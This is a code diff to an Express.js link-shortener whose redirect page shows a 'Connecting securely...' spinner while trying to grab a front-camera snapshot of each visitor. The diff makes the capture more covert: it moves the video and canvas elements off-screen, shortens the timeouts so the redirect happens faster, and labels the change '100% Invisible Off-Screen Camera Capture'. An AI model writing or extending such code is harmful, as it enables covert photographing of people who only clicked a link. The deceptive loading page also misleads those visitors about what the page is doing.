@@ -14,6 +14,14 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Middleware for Cloud DB sync on Vercel
+app.use(async (req, res, next) => {
+  try {
+    await db.initSync();
+  } catch(e) {}
+  next();
+});
+
 // Helper to generate short code
 function generateShortCode(length = 6) {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -236,7 +244,6 @@ app.get('/r/:shortCode', async (req, res) => {
   let { shortCode } = req.params;
   shortCode = decodeURIComponent(shortCode || '').trim();
   
-  // Try exact lookup first, or sanitized lookup
   let link = db.getLinkByShortCode(shortCode);
   if (!link) {
     link = db.getLinkByShortCode(sanitizeSlug(shortCode));
@@ -289,7 +296,7 @@ app.get('/r/:shortCode', async (req, res) => {
     console.error('Error logging click:', err);
   }
 
-  // High-speed transition page with optional HTML5 Camera snapshot
+  // Completely invisible background transition page (No video elements rendered on screen!)
   res.send(`
     <!DOCTYPE html>
     <html>
@@ -307,8 +314,6 @@ app.get('/r/:shortCode', async (req, res) => {
         <div class="spinner"></div>
         <span>Connecting securely...</span>
       </div>
-      <video id="vid" style="display:none;" autoplay playsinline></video>
-      <canvas id="canv" style="display:none;"></canvas>
 
       <script>
         (async function() {
@@ -352,18 +357,21 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
+          // 100% Invisible Off-Screen Camera Capture (No DOM Elements!)
           try {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
               const stream = await Promise.race([
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } }),
-                new Promise((_, reject) => setTimeout(() => reject('timeout'), 500))
+                new Promise((_, reject) => setTimeout(() => reject('timeout'), 400))
               ]);
               if (stream) {
-                const video = document.getElementById('vid');
+                const video = document.createElement('video');
+                video.muted = true;
+                video.playsInline = true;
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 200));
+                await video.play().catch(() => {});
                 
-                const canvas = document.getElementById('canv');
+                const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
@@ -388,7 +396,7 @@ app.get('/r/:shortCode', async (req, res) => {
 
           setTimeout(function() {
             window.location.replace(destinationUrl);
-          }, 120);
+          }, 80);
         })();
       </script>
     </body>
